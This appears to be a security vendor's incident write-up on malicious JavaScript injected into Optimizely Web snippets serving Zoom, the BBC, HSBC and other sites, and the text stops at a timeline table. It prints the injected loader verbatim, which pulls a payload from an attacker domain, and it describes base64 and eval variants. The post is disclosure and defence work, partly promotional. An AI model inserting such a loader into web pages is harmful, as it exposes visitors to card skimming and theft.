                <figure>
        <img srcset="https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w320/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 320w,
                    https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w600/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 600w,
                    https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w960/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 960w,
                    https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w1200/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 1200w,
                    https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w2000/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png 2000w" sizes="(max-width: 1200px) 100vw, 1120px" src="https://storage.ghost.io/c/2d/aa/2daa4f7f-a71b-47d2-a54c-06b8c60222ef/content/images/size/w1200/2026/11/Cybersecurity-Alert_-Malicious-Code-Injection.png" alt="World's Largest Brands Infected With Malware Via Optimizely">
    </figure>

        </header>

        <section>
            <p>On 16 November 2026, malicious JavaScript was served to visitors of <strong>178 organisations</strong> through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: <strong>Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock</strong>.</p><p>The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the <strong>Coruna and DarkSword iOS exploit kits</strong>. Crypto has already been stolen, with verified transactions to the attackers.</p><p><strong>This is exactly the kind of attack Report URI is designed to detect.</strong> Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.</p><p>The important lesson here is that <strong>trusted JavaScript doesn't always remain trustworthy</strong>. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.</p><p>Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.</p><h2 id="what-happened">What happened</h2><p>Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example <code>https://cdn.optimizely.com/js/6395285578973184.js</code>. The snippet contains Optimizely's code, the customer's experiments and an optional field called <strong>Project JavaScript</strong> (<code>projectJS</code>): custom code the customer writes in their Optimizely dashboard, which runs on every page.</p><p>The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from <code>cdn.optimizely.com</code>, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:</p><pre><code>"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();</code></pre><p>We saw three versions of the injected loader:</p><ol><li><strong>A plain <code>&lt;script&gt;</code> tag</strong> pointing at <code>https://1688360.cc/track.js</code> (most snippets).</li><li><strong>The same URL hidden in base64</strong> with <code>atob()</code>. A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.</li><li><strong>A full inline copy of the payload</strong>, which runs through <code>eval</code> if <code>1688360.cc</code> is blocked.</li></ol><p>Some customers serve their snippet from their own domain, such as <code>opt.scheels.com/js/&lt;id&gt;.js</code> or <code>www.vodafone.com.au/js/&lt;id&gt;.js</code>. Those were affected too, because the content comes from the same Optimizely project.</p><p><strong>We don't know how the attacker got write access</strong> to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for <code>www.optimizely.com</code> and <code>login.optimizely.com</code> both carried the code.</p><h2 id="timeline-utc">Timeline (UTC)</h2><table>
<thead>
<tr>
<th>Time</th>
<th>Event</th>
</tr>
</thead>
<tbody>
